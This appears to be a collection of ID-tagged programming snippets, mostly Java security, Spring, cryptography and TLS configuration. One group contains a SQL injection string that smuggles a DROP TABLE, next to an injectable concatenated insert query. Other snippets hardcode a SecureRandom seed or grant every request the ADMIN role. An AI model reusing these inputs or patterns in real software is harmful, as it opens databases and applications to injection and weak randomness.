---UNIQUEIDFORSNIP---|161752594|    if (this is a development ColdFusion enviornment)
    request.dsn = "development database";
    else
    request.dsn = "production database";
---UNIQUEIDFORSNIP---|161793490|    @Configuration
    public class WebMvcConfig extends WebMvcConfigurerAdapter {
    
      @Autowired 
      SecurityInterceptor securityInterceptor;
    
      @Override
      public void addInterceptors(InterceptorRegistry registry) {
        registry.addInterceptor(securityInterceptor); 
      }
    }
---UNIQUEIDFORSNIP---|161795532|    public class XFrameFilter extends OncePerRequestFilter {
    
        @Override
        protected void doFilterInternal(HttpServletRequest httpRequest,
                                        HttpServletResponse httpResponse,
                                        FilterChain filterChain) throws ServletException, IOException {
            httpResponse.setHeader("X-FRAME-OPTIONS", "DENY");
    
            filterChain.doFilter(httpRequest, httpResponse);
        }
    }    
---UNIQUEIDFORSNIP---|161801294|    @Override
    public final BigInteger getPrivateExponent() {
        if (key.isEngineBased()) {
            throw new UnsupportedOperationException("private exponent cannot be extracted");
        }
        ensureReadParams();
        return privateExponent;
    }
---UNIQUEIDFORSNIP---|161801299|    Cipher cipher1 = Cipher.getInstance("RSA/ECB/PKCS1Padding", "AndroidOpenSSL");
---UNIQUEIDFORSNIP---|161810231|    Query query = em.createQuery("DELETE Order WHERE customer = :customer");
    query.setParameter("customer", customer);
    query.executeUpdate();
---UNIQUEIDFORSNIP---|161881120|    KeyPairGenerator mcElieceKeyPairGenerator = KeyPairGenerator.getInstance("McEliece");
    mcElieceKeyPairGenerator.initialize(keysize, new SecureRandom());
    kp = mcElieceKeyPairGenerator.generateKeyPair();
    final byte[] publicKeyData = kp.getPublic().getEncoded(); 
    X509EncodedKeySpec publicKeySpec = new X509EncodedKeySpec(publicKeyData);
    KeyFactory mcElieceKeyFactory = KeyFactory.getInstance("McEliece");
    PublicKey regeneratedPublicKey = mcElieceKeyFactory.generatePublic(publicKeySpec);
    
    final byte[] privateKeyData = kp.getPrivate().getEncoded();
    PKCS8EncodedKeySpec privateKeySpec = new PKCS8EncodedKeySpec(privateKeyData);
    PrivateKey regeneratedPrivateKey = mcElieceKeyFactory.generatePrivate(privateKeySpec);
---UNIQUEIDFORSNIP---|162078946|    <dependencies>
            <dependency>
                <groupId>org.apache.poi</groupId>
                <artifactId>poi</artifactId>
                <version>3.11</version>
            </dependency>
    
            <dependency>
                <groupId>javax.validation</groupId>
                <artifactId>validation-api</artifactId>
                <version>1.1.0.Final</version>
            </dependency>
    
            <dependency>
                <groupId>org.hibernate</groupId>
                <artifactId>hibernate-core</artifactId>
                <version>4.3.8.Final</version>
            </dependency>
    
            <dependency>
                <groupId>org.hibernate</groupId>
                <artifactId>hibernate-validator</artifactId>
                <version>5.1.3.Final</version>
            </dependency>
    
            <dependency>
                <groupId>org.apache.poi</groupId>
                <artifactId>poi-ooxml</artifactId>
                <version>3.11</version>
            </dependency>
    
            <dependency>
                <groupId>org.apache.xmlbeans</groupId>
                <artifactId>xmlbeans</artifactId>
                <version>2.6.0</version>
            </dependency>
    
    
            <dependency>
                <groupId>mysql</groupId>
                <artifactId>mysql-connector-java</artifactId>
                <version>5.1.25</version>
            </dependency>
            <dependency>
                <groupId>commons-dbcp</groupId>
                <artifactId>commons-dbcp</artifactId>
                <version>1.4</version>
            </dependency>
            <dependency>
                <groupId>org.springframework</groupId>
                <artifactId>spring-core</artifactId>
                <version>4.1.6.RELEASE</version>
            </dependency>
            <dependency>
                <groupId>org.springframework</groupId>
                <artifactId>spring-webmvc</artifactId>
                <version>4.1.6.RELEASE</version>
            </dependency>
            <dependency>
                <groupId>org.springframework</groupId>
                <artifactId>spring-context</artifactId>
                <version>4.1.6.RELEASE</version>
            </dependency>
            <dependency>
                <groupId>org.springframework</groupId>
                <artifactId>spring-beans</artifactId>
                <version>4.1.6.RELEASE</version>
            </dependency>
            <dependency>
                <groupId>org.springframework</groupId>
                <artifactId>spring-jdbc</artifactId>
                <version>4.1.6.RELEASE</version>
            </dependency>
            <dependency>
                <groupId>org.springframework</groupId>
                <artifactId>spring-web</artifactId>
                <version>4.1.6.RELEASE</version>
            </dependency>
            <dependency>
                <groupId>javax.servlet</groupId>
                <artifactId>jstl</artifactId>
                <version>LATEST</version>
            </dependency>
            <dependency>
                <groupId>javax.servlet</groupId>
                <artifactId>javax.servlet-api</artifactId>
                <version>3.1.0</version>
            </dependency>
            <dependency>
                <groupId>commons-validator</groupId>
                <artifactId>commons-validator</artifactId>
                <version>1.4.1</version>
            </dependency>
            <dependency>
                <groupId>org.springframework.security</groupId>
                <artifactId>spring-security-core</artifactId>
                <version>4.0.0.RELEASE</version>
            </dependency>
            <dependency>
                <groupId>org.springframework.security</groupId>
                <artifactId>spring-security-web</artifactId>
                <version>4.0.0.RELEASE</version>
            </dependency>
            <dependency>
                <groupId>org.springframework.security</groupId>
                <artifactId>spring-security-config</artifactId>
                <version>4.0.0.RELEASE</version>
            </dependency>
    
        </dependencies>
    
        <repositories>
            <repository>
                <id>spring-releases</id>
                <url>https://repo.spring.io/libs-release</url>
            </repository>
        </repositories>
        <pluginRepositories>
            <pluginRepository>
                <id>spring-releases</id>
                <url>https://repo.spring.io/libs-release</url>
            </pluginRepository>
        </pluginRepositories>
---UNIQUEIDFORSNIP---|162078953|    <properties>
            <spring.core>4.1.6.RELEASE</spring.core>
            <spring.security>4.0.0.RELEASE</spring.security>
        </properties>
    
        <dependencies>
            <dependency>
                <groupId>org.springframework</groupId>
                <artifactId>spring-web</artifactId>
                <version>${spring.core}</version>
            </dependency>
            <dependency>
                <groupId>org.springframework</groupId>
                <artifactId>spring-webmvc</artifactId>
                <version>${spring.core}</version>
            </dependency>
            <dependency>
                <groupId>org.springframework</groupId>
                <artifactId>spring-jdbc</artifactId>
                <version>${spring.core}</version>
            </dependency>
    
            <dependency>
                <groupId>org.springframework.security</groupId>
                <artifactId>spring-security-web</artifactId>
                <version>${spring.security}</version>
            </dependency>
            <dependency>
                <groupId>org.springframework.security</groupId>
                <artifactId>spring-security-config</artifactId>
                <version>${spring.security}</version>
            </dependency>
    
            <dependency>
                <groupId>javax.validation</groupId>
                <artifactId>validation-api</artifactId>
                <version>1.1.0.Final</version>
            </dependency>
            <dependency>
                <groupId>commons-validator</groupId>
                <artifactId>commons-validator</artifactId>
                <version>1.4.1</version>
            </dependency>
    
            <dependency>
                <groupId>javax.servlet</groupId>
                <artifactId>jstl</artifactId>
                <version>1.2</version>
            </dependency>
    
            <dependency>
                <groupId>mysql</groupId>
                <artifactId>mysql-connector-java</artifactId>
                <version>5.1.25</version>
            </dependency>
        </dependencies>
---UNIQUEIDFORSNIP---|162096264|        #include<bits/stdc++.h>
    using namespace std;
    void create(int i,string domain,vector<bool>& included,string str,int len)
    {
        if(i==(len))
        {
            cout<<str<<endl;
            return;
        }
        for(int j=0;j<domain.length();j++)
        {
            if(included[j]==1)
            continue;
            else
            {
                included[j]=1;
                str+=domain[j];
                create(i+1,domain,included,str,len);
                included[j]=0;
                str.pop_back();
            }
        }
    }
    int main()
    {
        string domain = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890_$#-~";
        int lo=1;
        int hi=10;
        for(int i=lo;i<=hi;i++)
        {
            int len=i;
            string str;
            vector<bool> included(domain.length(),0);
            create(0,domain,included,str,len);
        }
       return 0;
    }
    
      
---UNIQUEIDFORSNIP---|162186760|    <http ...>
    	<form-login login-page="/authenticate" ... />
    </http>
---UNIQUEIDFORSNIP---|162186767|    package sample;
    import java.util.Iterator;
    import java.util.List;
     
    import org.springframework.beans.BeansException;
    import org.springframework.beans.factory.config.BeanDefinition;
    import org.springframework.beans.factory.config.ConfigurableListableBeanFactory;
    import org.springframework.beans.factory.support.BeanDefinitionRegistry;
    import org.springframework.beans.factory.support.BeanDefinitionRegistryPostProcessor;
    import org.springframework.security.web.DefaultSecurityFilterChain;
    import org.springframework.security.web.authentication.ui.DefaultLoginPageGeneratingFilter;
     
    public class Sec2919PostProcessor implements BeanDefinitionRegistryPostProcessor {
    	@Override
    	public void postProcessBeanDefinitionRegistry(BeanDefinitionRegistry registry)
    			throws BeansException {
    		String[] beanDefinitionNames = registry.getBeanDefinitionNames();
    		for(String name : beanDefinitionNames) {
    			BeanDefinition beanDefinition = registry.getBeanDefinition(name);
    			if(beanDefinition.getBeanClassName().equals(DefaultSecurityFilterChain.class.getName())) {
    				List<Object> filters = (List<Object>) beanDefinition.getConstructorArgumentValues().getArgumentValue(1, List.class).getValue();
    				Iterator<Object> iFilters = filters.iterator();
    				while(iFilters.hasNext()) {
    					Object f = iFilters.next();
    					if(f instanceof BeanDefinition) {
    						BeanDefinition bean = (BeanDefinition) f;
    						if(bean.getBeanClassName().equals(DefaultLoginPageGeneratingFilter.class.getName())) {
    							iFilters.remove();
    						}
    					}
    				}
    			}
    		}
    	}
     
    	@Override
    	public void postProcessBeanFactory(ConfigurableListableBeanFactory beanFactory)
    			throws BeansException {
    	}
    }
---UNIQUEIDFORSNIP---|162186771|    <bean class="sample.Sec2919PostProcessor"/>
---UNIQUEIDFORSNIP---|162237938|    johnny tables\';drop table foobar  --
---UNIQUEIDFORSNIP---|162237940|    'johnny tables\';drop table foobar--'
---UNIQUEIDFORSNIP---|162237942|    select name from scheduled where time > x and < y
---UNIQUEIDFORSNIP---|162237944|    String name = result['name'];
    String acct = result['acct'];
    String amt = result['amt'];
    string query = "insert into payment_process (name,acct,amt) values('"+name+"','"+acct+"','"+amt+"');
---UNIQUEIDFORSNIP---|162409259|	public static BigDecimal copyOf(BigDecimal value)
	{
        if (value == null || value.getClass() == BigDecimal.class)
			return value;
		return new BigDecimal(value.unscaledValue(), value.scale());
	}
---UNIQUEIDFORSNIP---|162446259|    SecRole-Support-ABC 
    SecRole-Utilisateurs-ABC
    SecRole-Utilisateurs-HPAM         
    SecRole-AdminSysteme   
    Another_One          
    Another_Two           
    SoOn             
    AndSoOn
---UNIQUEIDFORSNIP---|162471012|    Factory<SecurityManager> factory = new IniSecurityManagerFactory("classpath:shiro.ini");
    SecurityManager securityManager = factory.getInstance();
---UNIQUEIDFORSNIP---|162471014|    ShiroFilterFactoryBean factoryBean = new ShiroFilterFactoryBean();
    factoryBean.setSecurityManager(securityManager); // referring to previous
---UNIQUEIDFORSNIP---|162476575|    android {
        ...
        defaultConfig {
            ...
        }
    
        buildTypes {
            release {
            ...
        }
        
        buildTypes.each {
            it.buildConfigField 'String', 'MY_API_TOKEN_KEY', MyApiTokenValue
        }
    }
---UNIQUEIDFORSNIP---|162476577|    BuildConfig.MY_API_TOKEN_KEY
---UNIQUEIDFORSNIP---|162583976|      javax.net.ssl.SSLHandshakeException: 
      sun.security.validator.ValidatorException: PKIX path building failed:
      sun.security.provider.certpath.SunCertPathBuilderException:
      unable to find valid certification path to requested target
---UNIQUEIDFORSNIP---|162634732|    UrlValidator urlValidator = new UrlValidator(schemes);
    if (urlValidator.isValid("http://somesite.com")) {
       //valid
    }
---UNIQUEIDFORSNIP---|162815515|    public void checkExec(String cmd) {
        System.out.println(cmd); // prints "java"
        if (cmd.toLowerCase().startsWith("java ") { ... } // is false
        // no security exception is thrown, allowing your command
    }
---UNIQUEIDFORSNIP---|162939458|    protected void configure(HttpSecurity http) throws Exception {        
        http.authorizeRequests()                
                .antMatchers("/rest/open/**").permitAll()
                .antMatchers("/login/**").permitAll()
                .anyRequest().authenticated()
                .and()
            .formLogin()
                .loginPage("/login")
                .failureUrl("/login?error")
                .defaultSuccessUrl("/dashboard")
                .loginProcessingUrl("/j_spring_security_check")
                .usernameParameter("username")
                .passwordParameter("password")
                .and()
            .logout()
                .logoutUrl("/j_spring_security_logout")
                .logoutSuccessUrl("/login?logout")
                .and()
            .csrf();
    }
---UNIQUEIDFORSNIP---|162989582|        @Bean
        public TicketValidator ticketValidator() {
            return new Cas20ServiceTicketValidator("https://localhost:8443/cas/p3");
        }
---UNIQUEIDFORSNIP---|163031945|	SSLServerSocketFactory ssf = (SSLServerSocketFactory)SSLServerSocketFactory.getDefault();
	
	TreeMap<String, Boolean> ciphers = new TreeMap<>();
	for (String cipher : ssf.getSupportedCipherSuites())
		ciphers.put(cipher, Boolean.FALSE);
	for (String cipher : ssf.getDefaultCipherSuites())
		ciphers.put(cipher, Boolean.TRUE);
	
	System.out.println("Default Cipher");
	for (Entry<String, Boolean> cipher : ciphers.entrySet())
		System.out.printf("   %-5s%s%n", (cipher.getValue() ? '*' : ' '), cipher.getKey());
---UNIQUEIDFORSNIP---|163031947|	Default Cipher
	        SSL_DHE_DSS_EXPORT_WITH_DES40_CBC_SHA
	   *    SSL_DHE_DSS_WITH_3DES_EDE_CBC_SHA
	        SSL_DHE_DSS_WITH_DES_CBC_SHA
	        SSL_DHE_RSA_EXPORT_WITH_DES40_CBC_SHA
	   *    SSL_DHE_RSA_WITH_3DES_EDE_CBC_SHA
	        SSL_DHE_RSA_WITH_DES_CBC_SHA
	        SSL_DH_anon_EXPORT_WITH_DES40_CBC_SHA
	        SSL_DH_anon_WITH_3DES_EDE_CBC_SHA
	        SSL_DH_anon_WITH_DES_CBC_SHA
	        SSL_RSA_EXPORT_WITH_DES40_CBC_SHA
	   *    SSL_RSA_WITH_3DES_EDE_CBC_SHA
	        SSL_RSA_WITH_DES_CBC_SHA
	        SSL_RSA_WITH_NULL_MD5
	        SSL_RSA_WITH_NULL_SHA
	   *    TLS_DHE_DSS_WITH_AES_128_CBC_SHA
	   *    TLS_DHE_DSS_WITH_AES_128_CBC_SHA256
	   *    TLS_DHE_DSS_WITH_AES_128_GCM_SHA256
	   *    TLS_DHE_RSA_WITH_AES_128_CBC_SHA
	   *    TLS_DHE_RSA_WITH_AES_128_CBC_SHA256
	   *    TLS_DHE_RSA_WITH_AES_128_GCM_SHA256
	        TLS_DH_anon_WITH_AES_128_CBC_SHA
	        TLS_DH_anon_WITH_AES_128_CBC_SHA256
	        TLS_DH_anon_WITH_AES_128_GCM_SHA256
	   *    TLS_ECDHE_ECDSA_WITH_3DES_EDE_CBC_SHA
	   *    TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA
	   *    TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA256
	   *    TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256
	        TLS_ECDHE_ECDSA_WITH_NULL_SHA
	   *    TLS_ECDHE_RSA_WITH_3DES_EDE_CBC_SHA
	   *    TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA
	   *    TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA256
	   *    TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256
	        TLS_ECDHE_RSA_WITH_NULL_SHA
	   *    TLS_ECDH_ECDSA_WITH_3DES_EDE_CBC_SHA
	   *    TLS_ECDH_ECDSA_WITH_AES_128_CBC_SHA
	   *    TLS_ECDH_ECDSA_WITH_AES_128_CBC_SHA256
	   *    TLS_ECDH_ECDSA_WITH_AES_128_GCM_SHA256
	        TLS_ECDH_ECDSA_WITH_NULL_SHA
	   *    TLS_ECDH_RSA_WITH_3DES_EDE_CBC_SHA
	   *    TLS_ECDH_RSA_WITH_AES_128_CBC_SHA
	   *    TLS_ECDH_RSA_WITH_AES_128_CBC_SHA256
	   *    TLS_ECDH_RSA_WITH_AES_128_GCM_SHA256
	        TLS_ECDH_RSA_WITH_NULL_SHA
	        TLS_ECDH_anon_WITH_3DES_EDE_CBC_SHA
	        TLS_ECDH_anon_WITH_AES_128_CBC_SHA
	        TLS_ECDH_anon_WITH_NULL_SHA
	   *    TLS_EMPTY_RENEGOTIATION_INFO_SCSV
	        TLS_KRB5_EXPORT_WITH_DES_CBC_40_MD5
	        TLS_KRB5_EXPORT_WITH_DES_CBC_40_SHA
	        TLS_KRB5_WITH_3DES_EDE_CBC_MD5
	        TLS_KRB5_WITH_3DES_EDE_CBC_SHA
	        TLS_KRB5_WITH_DES_CBC_MD5
	        TLS_KRB5_WITH_DES_CBC_SHA
	   *    TLS_RSA_WITH_AES_128_CBC_SHA
	   *    TLS_RSA_WITH_AES_128_CBC_SHA256
	   *    TLS_RSA_WITH_AES_128_GCM_SHA256
	        TLS_RSA_WITH_NULL_SHA256
---UNIQUEIDFORSNIP---|163031950|	Default Cipher
	        SSL_DHE_DSS_EXPORT_WITH_DES40_CBC_SHA
	   *    SSL_DHE_DSS_WITH_3DES_EDE_CBC_SHA
	        SSL_DHE_DSS_WITH_DES_CBC_SHA
	        SSL_DHE_RSA_EXPORT_WITH_DES40_CBC_SHA
	   *    SSL_DHE_RSA_WITH_3DES_EDE_CBC_SHA
	        SSL_DHE_RSA_WITH_DES_CBC_SHA
	        SSL_DH_anon_EXPORT_WITH_DES40_CBC_SHA
	        SSL_DH_anon_WITH_3DES_EDE_CBC_SHA
	        SSL_DH_anon_WITH_DES_CBC_SHA
	        SSL_RSA_EXPORT_WITH_DES40_CBC_SHA
	   *    SSL_RSA_WITH_3DES_EDE_CBC_SHA
	        SSL_RSA_WITH_DES_CBC_SHA
	        SSL_RSA_WITH_NULL_MD5
	        SSL_RSA_WITH_NULL_SHA
	   *    TLS_DHE_DSS_WITH_AES_128_CBC_SHA
	   *    TLS_DHE_DSS_WITH_AES_128_CBC_SHA256
	   *    TLS_DHE_DSS_WITH_AES_128_GCM_SHA256
	   *    TLS_DHE_DSS_WITH_AES_256_CBC_SHA
	   *    TLS_DHE_DSS_WITH_AES_256_CBC_SHA256
	   *    TLS_DHE_DSS_WITH_AES_256_GCM_SHA384
	   *    TLS_DHE_RSA_WITH_AES_128_CBC_SHA
	   *    TLS_DHE_RSA_WITH_AES_128_CBC_SHA256
	   *    TLS_DHE_RSA_WITH_AES_128_GCM_SHA256
	   *    TLS_DHE_RSA_WITH_AES_256_CBC_SHA
	   *    TLS_DHE_RSA_WITH_AES_256_CBC_SHA256
	   *    TLS_DHE_RSA_WITH_AES_256_GCM_SHA384
	        TLS_DH_anon_WITH_AES_128_CBC_SHA
	        TLS_DH_anon_WITH_AES_128_CBC_SHA256
	        TLS_DH_anon_WITH_AES_128_GCM_SHA256
	        TLS_DH_anon_WITH_AES_256_CBC_SHA
	        TLS_DH_anon_WITH_AES_256_CBC_SHA256
	        TLS_DH_anon_WITH_AES_256_GCM_SHA384
	   *    TLS_ECDHE_ECDSA_WITH_3DES_EDE_CBC_SHA
	   *    TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA
	   *    TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA256
	   *    TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256
	   *    TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA
	   *    TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA384
	   *    TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384
	        TLS_ECDHE_ECDSA_WITH_NULL_SHA
	   *    TLS_ECDHE_RSA_WITH_3DES_EDE_CBC_SHA
	   *    TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA
	   *    TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA256
	   *    TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256
	   *    TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA
	   *    TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA384
	   *    TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384
	        TLS_ECDHE_RSA_WITH_NULL_SHA
	   *    TLS_ECDH_ECDSA_WITH_3DES_EDE_CBC_SHA
	   *    TLS_ECDH_ECDSA_WITH_AES_128_CBC_SHA
	   *    TLS_ECDH_ECDSA_WITH_AES_128_CBC_SHA256
	   *    TLS_ECDH_ECDSA_WITH_AES_128_GCM_SHA256
	   *    TLS_ECDH_ECDSA_WITH_AES_256_CBC_SHA
	   *    TLS_ECDH_ECDSA_WITH_AES_256_CBC_SHA384
	   *    TLS_ECDH_ECDSA_WITH_AES_256_GCM_SHA384
	        TLS_ECDH_ECDSA_WITH_NULL_SHA
	   *    TLS_ECDH_RSA_WITH_3DES_EDE_CBC_SHA
	   *    TLS_ECDH_RSA_WITH_AES_128_CBC_SHA
	   *    TLS_ECDH_RSA_WITH_AES_128_CBC_SHA256
	   *    TLS_ECDH_RSA_WITH_AES_128_GCM_SHA256
	   *    TLS_ECDH_RSA_WITH_AES_256_CBC_SHA
	   *    TLS_ECDH_RSA_WITH_AES_256_CBC_SHA384
	   *    TLS_ECDH_RSA_WITH_AES_256_GCM_SHA384
	        TLS_ECDH_RSA_WITH_NULL_SHA
	        TLS_ECDH_anon_WITH_3DES_EDE_CBC_SHA
	        TLS_ECDH_anon_WITH_AES_128_CBC_SHA
	        TLS_ECDH_anon_WITH_AES_256_CBC_SHA
	        TLS_ECDH_anon_WITH_NULL_SHA
	   *    TLS_EMPTY_RENEGOTIATION_INFO_SCSV
	        TLS_KRB5_EXPORT_WITH_DES_CBC_40_MD5
	        TLS_KRB5_EXPORT_WITH_DES_CBC_40_SHA
	        TLS_KRB5_WITH_3DES_EDE_CBC_MD5
	        TLS_KRB5_WITH_3DES_EDE_CBC_SHA
	        TLS_KRB5_WITH_DES_CBC_MD5
	        TLS_KRB5_WITH_DES_CBC_SHA
	   *    TLS_RSA_WITH_AES_128_CBC_SHA
	   *    TLS_RSA_WITH_AES_128_CBC_SHA256
	   *    TLS_RSA_WITH_AES_128_GCM_SHA256
	   *    TLS_RSA_WITH_AES_256_CBC_SHA
	   *    TLS_RSA_WITH_AES_256_CBC_SHA256
	   *    TLS_RSA_WITH_AES_256_GCM_SHA384
	        TLS_RSA_WITH_NULL_SHA256
---UNIQUEIDFORSNIP---|163105235|    private String sha1(String s, String keyString) throws UnsupportedEncodingException, NoSuchAlgorithmException, InvalidKeyException {
    
    SecretKeySpec key = new SecretKeySpec((keyString).getBytes("UTF-8"), "HmacSHA1");
    Mac mac = Mac.getInstance("HmacSHA1");
    mac.init(key);
     
    byte[] bytes = mac.doFinal(s.getBytes("UTF-8"));
     
    return new String( Base64.encodeBase64(bytes));
    
    }
---UNIQUEIDFORSNIP---|163269197|    @Provider
    @Priority(Priorities.AUTHENTICATION)
    public class SecurityFilter implements ContainerRequestFilter {
    
        @Override
        public void filter(ContainerRequestContext requestContext) throws IOException {
            SecurityContext originalContext = requestContext.getSecurityContext();
            Set<String> roles = new HashSet<>();
            roles.add("ADMIN");
            Authorizer authorizer = new Authorizer(roles, "admin", 
                                                   originalContext.isSecure());
            requestContext.setSecurityContext(authorizer);
        }
        
        public static class Authorizer implements SecurityContext {
            
            Set<String> roles;
            String username;
            boolean isSecure;
            public Authorizer(Set<String> roles, final String username, 
                                                 boolean isSecure) {
                this.roles = roles;
                this.username = username;
                this.isSecure = isSecure;
            }
    
            @Override
            public Principal getUserPrincipal() {
                return new User(username);
            }
    
            @Override
            public boolean isUserInRole(String role) {
                return roles.contains(role);
            }
    
            @Override
            public boolean isSecure() {
                return isSecure;
            }
    
            @Override
            public String getAuthenticationScheme() {
                return "Your Scheme";
            } 
        } 
        
        public static class User implements Principal {
            String name;
            
            public User(String name) {
                this.name = name;
            }
    
            @Override
            public String getName() { return name; }   
        }
    }
---UNIQUEIDFORSNIP---|163269209|    @Path("secure")
    public class SecuredResource {
        @GET
        @RolesAllowed({"ADMIN"})
        public String getUsername(@Context SecurityContext securityContext) {
            User user = (User)securityContext.getUserPrincipal();
            return user.getName();
        }
    }
---UNIQUEIDFORSNIP---|163269211|    To enable this feature with Jersey, we need to register the `RolesAllowedDynamicFeature`
        @ApplicationPath("/api")
        public class AppConfig extends ResourceConfig {
        
            public AppConfig() {
                packages("packages.to.scan");
                register(RolesAllowedDynamicFeature.class);
            }
        }
---UNIQUEIDFORSNIP---|163331252|    @Before("@annotation(com.company.annotation.AuthorizeUser) && execution(String *.*(..))")
    public void isAuthorizedString(JoinPoint jp) {
        ...
    }
    @Before("@annotation(com.company.annotation.AuthorizeUser) && execution(Response *.*(..))")
    public void isAuthorizedResponse(JoinPoint jp) {
        ...
    }
---UNIQUEIDFORSNIP---|163331256|    @Before("@annotation(com.company.annotation.AuthorizeUser")
    public void isAuthorized(JoinPoint jp) {
        Class<?> returnType = ((MethodSignature)jp.getStaticPart()
                .getSignature()).getReturnType();
        if(returnType == String.class)
            ...
        else
            ...
    }
---UNIQUEIDFORSNIP---|163353534|    SecureRandom sr = SecureRandom.getInstance("SHA1PRNG");
    sr.setSeed("abcdefghijklmnop".getBytes("us-ascii"));
---UNIQUEIDFORSNIP---|163522859|    ssh-keygen -e -m PKCS8 -f id_rsa.pub >pub.pem # change filename as needed
---UNIQUEIDFORSNIP---|163522861|    openssl rsa -in pub.pem -out pub.der -outform der # any version
    openssl pkey -pubin -in pub.pem -out pub.der -outform der # 1.0.0 up
---UNIQUEIDFORSNIP---|163522863|    openssl rsa -in id_rsa =pubout -out pub.pem # default PEM
    openssl rsa -in id_rsa -pubout -out pub.der -outform der # DER
    openssl pkey -in id_rsa =pubout -out pub.pem # default PEM, 1.0.0 up
    openssl pkey -in id_rsa -pubput -out pub.der -outform der # DER, 1.0.0
---UNIQUEIDFORSNIP---|163535482|    import java.util.Scanner;
---UNIQUEIDFORSNIP---|163535485|    public static void main(String args[]){
        Scanner keyboard = new Scanner(System.in);
        System.out.println("Enter your text");  
        String textToEncrypt = keyboard.next();
        
        String encrypted = DesEncrypter.NAGASAKTI.encrypt(textToEncrypt);
        System.out.println("encrypted text=  "+ encrypted);
    }
       
---UNIQUEIDFORSNIP---|163535488|    System.out.println("Enter your pass phrase");  
    String passPhrase = keyboard.next();
    String encrypted = new DesEncrypter(passPhrase).encrypt(textToEncrypt);
---UNIQUEIDFORSNIP---|164096231|    import java.io.BufferedInputStream;
    import java.io.BufferedOutputStream;
    import java.io.BufferedReader;
    import java.io.FileInputStream;
    import java.io.FileOutputStream;
    import java.io.FileReader;
    import java.io.IOException;
    import java.io.InputStream;
    import java.io.ObjectInputStream;
    import java.io.ObjectOutputStream;
    import java.math.BigInteger;
    import java.security.Key;
    import java.security.KeyFactory;
    import java.security.KeyPair;
    import java.security.KeyPairGenerator;
    import java.security.PrivateKey;
    import java.security.PublicKey;
    import java.security.spec.KeySpec;
    import java.security.spec.RSAPrivateKeySpec;
    import java.security.spec.RSAPublicKeySpec;
    import javax.crypto.Cipher;
    import javax.crypto.CipherInputStream;
    import javax.crypto.CipherOutputStream;
    class RSA{
    public static void main(String[] args) throws Exception {
        generateKeys();
        rsaEncrypt("plaintext.txt", "encrypted.txt");
        rsaDecrypt("encrypted.txt", "decrypted.txt");
    }
    public static void generateKeys() throws Exception {
        KeyPairGenerator kpg = KeyPairGenerator.getInstance("RSA");
        kpg.initialize(2048);
        KeyPair kp = kpg.genKeyPair();
        PublicKey publicKey = kp.getPublic();
        PrivateKey privateKey = kp.getPrivate();
        System.out.println("keys created");
        KeyFactory fact = KeyFactory.getInstance("RSA");
        RSAPublicKeySpec pub = fact.getKeySpec(publicKey,
                RSAPublicKeySpec.class);
        RSAPrivateKeySpec priv = fact.getKeySpec(privateKey,
                RSAPrivateKeySpec.class);
        saveToFile("public.key", pub.getModulus(), pub.getPublicExponent());
        saveToFile("private.key", priv.getModulus(), priv.getPrivateExponent());
        System.out.println("keys saved");
    }
    public static void saveToFile(String fileName, BigInteger mod,
            BigInteger exp) throws IOException {
        ObjectOutputStream fileOut = new ObjectOutputStream(
                new BufferedOutputStream(new FileOutputStream(fileName)));
        try {
            fileOut.writeObject(mod);
            fileOut.writeObject(exp);
        } catch (Exception e) {
            throw new IOException("Unexpected error");
        } finally {
            fileOut.close();
            System.out.println("Closed writing file.");
        }
    }
    // Return the saved key
    static Key readKeyFromFile(String keyFileName) throws IOException {
        InputStream in = new FileInputStream(keyFileName);
        ObjectInputStream oin = new ObjectInputStream(new BufferedInputStream(
                in));
        try {
            BigInteger m = (BigInteger) oin.readObject();
            BigInteger e = (BigInteger) oin.readObject();
            KeyFactory fact = KeyFactory.getInstance("RSA");
            if (keyFileName.startsWith("public"))
                return fact.generatePublic(new RSAPublicKeySpec(m, e));
            else
                return fact.generatePrivate(new RSAPrivateKeySpec(m, e));
        } catch (Exception e) {
            throw new RuntimeException("Spurious serialisation error", e);
        } finally {
            oin.close();
            System.out.println("Closed reading file.");
        }
    }
    // Use this PublicKey object to initialize a Cipher and encrypt some data
    public static void rsaEncrypt(String file_loc, String file_des)
            throws Exception {
    	FileReader file = new FileReader("C://myprograms//plaintext.txt");
		BufferedReader reader = new BufferedReader(file);
		String text = "";
		String line = reader.readLine();
		while(line!= null)
		{
			text += line;
		line = reader.readLine();
		}
		reader.close();
		System.out.println(text);
    	byte[] data = new byte[32];
        int i;
        System.out.println("start encyption");
        Key pubKey = readKeyFromFile("public.key");
        Cipher cipher = Cipher.getInstance("RSA");
        cipher.init(Cipher.ENCRYPT_MODE, pubKey);
        FileInputStream fileIn = new FileInputStream(file_loc);
        FileOutputStream fileOut = new FileOutputStream(file_des);
        CipherOutputStream cipherOut = new CipherOutputStream(fileOut, cipher);
        // Read in the data from the file and encrypt it
        while ((i = fileIn.read(data)) != -1) {
            cipherOut.write(data, 0, i);
        }
        // Close the encrypted file
        cipherOut.close();
        fileIn.close();
        System.out.println("encrypted file created");
    }
    // Use this PublicKey object to initialize a Cipher and decrypt some data
    public static void rsaDecrypt(String file_loc, String file_des)
            throws Exception {
        byte[] data = new byte[32];
        int i;
        System.out.println("start decyption");
        Key priKey = readKeyFromFile("private.key");
        Cipher cipher = Cipher.getInstance("RSA");
        cipher.init(Cipher.DECRYPT_MODE, priKey);
        FileInputStream fileIn = new FileInputStream(file_loc);
        CipherInputStream cipherIn = new CipherInputStream(fileIn, cipher);
        FileOutputStream fileOut = new FileOutputStream(file_des);
        // Write data to new file
        while ((i = cipherIn.read()) != -1) {
            fileOut.write(i);
        }
        // Close the file
        fileIn.close();
        cipherIn.close();
